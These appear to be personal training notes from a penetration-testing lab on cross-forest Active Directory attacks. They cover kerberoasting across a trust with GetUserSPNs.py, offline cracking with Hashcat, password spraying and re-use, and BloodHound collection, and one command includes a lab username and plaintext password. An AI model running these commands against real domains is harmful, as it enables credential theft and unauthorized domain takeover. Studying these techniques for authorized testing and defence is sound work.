# All the Possible Cross-Forest Attacks

- cross-forest kerberoasting
- cracked hash can be used to attempt a password spray against the root domain
- Admin password Re-Use & Group Membership
- sid history abuse also possible but not covered in module
## cross forest kerberoasting
t is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py`

find all kerberoastable users in trusting forest
```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL ad.someorg.local/wley
```

request tgs for domain users in trusting forest
```shell-session
 GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL ad.someorg.local/wley   -request 
```

- We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin.

- it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain.
![[Pasted image 20250930224649.png]]

---
## Hunting Foreign Group Membership with Bloodhound-python
Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.
## Kerberoast From linux

get accounst with SPN set on a trusted forest domain
```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL ad.someorg.local/wley
```

get all TGS Tickets  on a trusted forest domain
```shell-session
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL ad.someorg.local/wley  outputfile <forestdomainname_ticketsTGS>
```

attempt password spray with the cracked password.

---
## Running BLoodHound on Different/Forest Domain

### add DC01 IP from Root domain as a nameserver and add forest domain name to /etc/resolv.conf


```shell-session
 cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```
## Collecting BH Data for forest domain
collect BLoodhound data for the Forest domain freightlogistics
```shell-session
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@ad.someorg.local -p Klmcargo2
```

Once this is in place, we can run the tool against the target domain as follows:
```shell-session
$ bloodhound-python -d ad.someorg.local -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

```shell-session
zip -r ilfreight_bh.zip *.json
```

After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `ad.someorg.local`. Here, we will see the built-in Administrator account for the ad.someorg.local domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

![[Pasted image 20250728013635.png]]